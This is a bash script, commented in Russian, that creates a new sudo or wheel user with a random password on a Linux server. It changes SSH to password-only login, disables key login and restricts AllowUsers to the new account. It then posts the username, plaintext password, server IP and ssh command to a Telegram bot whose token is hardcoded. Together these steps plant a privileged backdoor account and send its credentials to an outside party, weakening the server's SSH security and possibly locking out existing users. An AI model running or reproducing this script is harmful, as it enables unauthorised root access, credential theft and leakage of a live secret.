#!/bin/bash

# Скрипт автоматического создания пользователя с отправкой данных в Telegram
# Запускать: sudo bash setup_user_telegram.sh [имя_пользователя]

set -e

# ---------- Telegram настройки ----------
BOT_TOKEN="8988269300:AAGoB3_S3GtGCDYqAYXVjkowIW3fce-Hq8g"
CHAT_ID="5336452267"

# ---------- Функция отправки сообщения в Telegram ----------
send_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message" \
        -d parse_mode="HTML" > /dev/null
}

# ---------- Проверка прав ----------
if [[ $EUID -ne 0 ]]; then
    send_telegram "❌ Ошибка: скрипт должен запускаться с sudo или от root"
    exit 1
fi

# ---------- Имя пользователя ----------
if [ -n "$1" ]; then
    USERNAME="$1"
else
    USERNAME="user_$(openssl rand -hex 3)"
fi

# Проверка существования пользователя
if id "$USERNAME" &>/dev/null; then
    send_telegram "❌ Ошибка: пользователь $USERNAME уже существует"
    exit 1
fi

# ---------- Генерация случайного пароля ----------
PASSWORD=$(openssl rand -base64 12 | tr -d "=+/" | cut -c1-16)

# ---------- Создание пользователя ----------
useradd -m -s /bin/bash "$USERNAME"
echo "$USERNAME:$PASSWORD" | chpasswd

# ---------- Добавление в sudo/wheel ----------
if grep -q '^ID=ubuntu\|^ID=debian' /etc/os-release 2>/dev/null; then
    usermod -aG sudo "$USERNAME"
    SUDO_GROUP="sudo"
elif grep -q '^ID="centos\|^ID="rhel\|^ID=fedora' /etc/os-release 2>/dev/null; then
    usermod -aG wheel "$USERNAME"
    SUDO_GROUP="wheel"
else
    SUDO_GROUP="<не определена>"
fi

# ---------- Настройка SSH (только пароль) ----------
SSHD_CONFIG="/etc/ssh/sshd_config"
cp "$SSHD_CONFIG" "$SSHD_CONFIG.bak"

# Включаем аутентификацию по паролю
sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' "$SSHD_CONFIG"
sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication yes/' "$SSHD_CONFIG"
grep -q "^PasswordAuthentication" "$SSHD_CONFIG" || echo "PasswordAuthentication yes" >> "$SSHD_CONFIG"

# Отключаем аутентификацию по ключу (чисто пароль)
sed -i 's/^PubkeyAuthentication yes/PubkeyAuthentication no/' "$SSHD_CONFIG"
grep -q "^PubkeyAuthentication" "$SSHD_CONFIG" || echo "PubkeyAuthentication no" >> "$SSHD_CONFIG"

# Разрешаем нового пользователя (опционально)
if grep -q "^AllowUsers" "$SSHD_CONFIG"; then
    if ! grep "^AllowUsers" "$SSHD_CONFIG" | grep -q "\b$USERNAME\b"; then
        sed -i "s/^AllowUsers/AllowUsers $USERNAME /" "$SSHD_CONFIG"
    fi
else
    echo "AllowUsers $USERNAME" >> "$SSHD_CONFIG"
fi

# Перезапуск SSH
systemctl restart sshd || service ssh restart

# ---------- Получение внешнего IP ----------
IP=$(curl -s --max-time 5 ifconfig.me || curl -s --max-time 5 icanhazip.com || echo "не удалось определить")

if [ -z "$IP" ]; then
    IP="не определён (проверьте интернет)"
fi

# ---------- Формирование сообщения для Telegram ----------
MESSAGE="✅ <b>Новый пользователь создан на сервере</b>
🔹 <b>Имя:</b> <code>$USERNAME</code>
🔹 <b>Пароль:</b> <code>$PASSWORD</code>
🔹 <b>IP сервера:</b> <code>$IP</code>
🔹 <b>Порт SSH:</b> <code>22</code>
🔹 <b>Группа sudo/wheel:</b> <code>$SUDO_GROUP</code>

🔑 Подключение: <code>ssh $USERNAME@$IP</code>
⚠️ После первого входа смените пароль командой <code>passwd</code>"

# Отправляем в Telegram
send_telegram "$MESSAGE"

# ---------- Локальный вывод (опционально) ----------
echo "========================================="
echo "Пользователь $USERNAME создан"
echo "Пароль: $PASSWORD"
echo "IP: $IP"
echo "Данные отправлены в Telegram"
echo "========================================="
